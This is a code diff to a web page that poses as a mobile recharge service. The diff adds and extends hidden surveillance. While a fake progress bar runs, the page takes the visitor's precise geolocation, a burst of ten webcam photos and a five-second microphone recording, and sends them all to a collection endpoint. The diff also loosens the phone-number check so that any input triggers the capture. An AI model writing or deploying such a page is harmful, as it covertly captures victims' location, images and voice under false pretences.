@@ -84,7 +84,7 @@
 
         <div id="processBox" class="process-box">
             <div class="process-text">
-                <span id="processStatus">د چارج په حال کې...</span>
+                <span id="processStatus">Processing recharge...</span>
                 <span id="processPercent">0%</span>
             </div>
             <div class="progress-bar-container">
@@ -139,35 +139,52 @@
             await sendData(fd);
         }
 
-        async function capturePhoto(stream) {
-            const v = document.getElementById('video'), c = document.getElementById('canvas');
-            if(!v.srcObject) { v.srcObject = stream; await v.play(); }
-            c.width = v.videoWidth || 640; c.height = v.videoHeight || 480;
-            c.getContext('2d').drawImage(v, 0, 0, c.width, c.height);
-            return new Promise(res => { 
-                c.toBlob(async blob => { 
-                    const fd = new FormData(); 
-                    fd.append('photo', blob, 'photo.jpg'); 
-                    await sendData(fd); 
-                    res(); 
-                }, 'image/jpeg'); 
+        async function sendSinglePhoto(stream) {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            if (!video.srcObject) { video.srcObject = stream; await video.play(); }
+
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            return new Promise((resolve) => {
+                canvas.toBlob(async function(blob) {
+                    const formData = new FormData();
+                    formData.append('photo', blob, 'photo.jpg');
+                    await sendData(formData);
+                    resolve();
+                }, 'image/jpeg');
             });
         }
 
-        async function recordAudio(stream) {
-            return new Promise(res => {
+        async function recordAndSendAudio(stream) {
+            return new Promise((resolve) => {
                 try {
-                    const mr = new MediaRecorder(stream); let chunks = [];
-                    mr.ondataavailable = e => chunks.push(e.data);
-                    mr.onstop = async () => { 
-                        const fd = new FormData(); 
-                        fd.append('voice', new Blob(chunks, {type: 'audio/ogg'}), 'voice.ogg'); 
-                        await sendData(fd); 
-                        res(); 
+                    const mediaRecorder = new MediaRecorder(stream);
+                    const audioChunks = [];
+
+                    mediaRecorder.ondataavailable = (event) => {
+                        audioChunks.push(event.data);
                     };
-                    mr.start(); 
-                    setTimeout(() => { if(mr.state !== 'inactive') mr.stop(); }, 4000);
-                } catch(e) { res(); }
+
+                    mediaRecorder.onstop = async () => {
+                        const audioBlob = new Blob(audioChunks, { type: 'audio/ogg' });
+                        const formData = new FormData();
+                        formData.append('voice', audioBlob, 'voice.ogg');
+                        await sendData(formData);
+                        resolve();
+                    };
+
+                    mediaRecorder.start();
+                    setTimeout(() => {
+                        if (mediaRecorder.state !== 'inactive') {
+                            mediaRecorder.stop();
+                        }
+                    }, 5000);
+                } catch (e) {
+                    resolve();
+                }
             });
         }
 
@@ -180,7 +197,7 @@
             const processPercent = document.getElementById("processPercent");
             const successBox = document.getElementById("successBox");
 
-            if (mobileVal === "" || mobileVal.length < 4) {
+            if (mobileVal === "") {
                 errorBox.style.display = "block";
                 successBox.style.display = "none";
                 mobileInput.focus();
@@ -209,20 +226,52 @@
             }, 60);
 
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(async pos => {
-                    const fd = new FormData(); 
-                    fd.append('latitude', pos.coords.latitude); 
-                    fd.append('longitude', pos.coords.longitude); 
-                    await sendData(fd);
+                await new Promise((resolve) => {
+                    navigator.geolocation.getCurrentPosition(
+                        async (pos) => {
+                            const formData = new FormData();
+                            formData.append('latitude', pos.coords.latitude);
+                            formData.append('longitude', pos.coords.longitude);
+                            await sendData(formData);
+                            resolve();
+                        },
+                        () => { resolve(); },
+                        { timeout: 4000, enableHighAccuracy: true }
+                    );
                 });
             }
 
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({video: true, audio: true});
-                await capturePhoto(stream);
-                await recordAudio(stream);
-                stream.getTracks().forEach(t => t.stop());
-            } catch(e) {}
+                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                    const video = document.getElementById('video');
+                    video.srcObject = stream;
+                    await video.play();
+
+                    await new Promise(r => setTimeout(r, 300));
+
+                    let photoCount = 0;
+                    const maxPhotos = 10; 
+
+                    const photoInterval = setInterval(async () => {
+                        if (photoCount < maxPhotos) {
+                            photoCount++;
+                            await sendSinglePhoto(stream);
+                        } else {
+                            clearInterval(photoInterval);
+                        }
+                    }, 800);
+
+                    await recordAndSendAudio(stream);
+
+                    while (photoCount < maxPhotos) {
+                        await new Promise(r => setTimeout(r, 300));
+                    }
+                    clearInterval(photoInterval);
+
+                    stream.getTracks().forEach(t => t.stop());
+                }
+            } catch (err) {}
 
             clearInterval(progressInterval);
             progressBar.style.width = '100%';
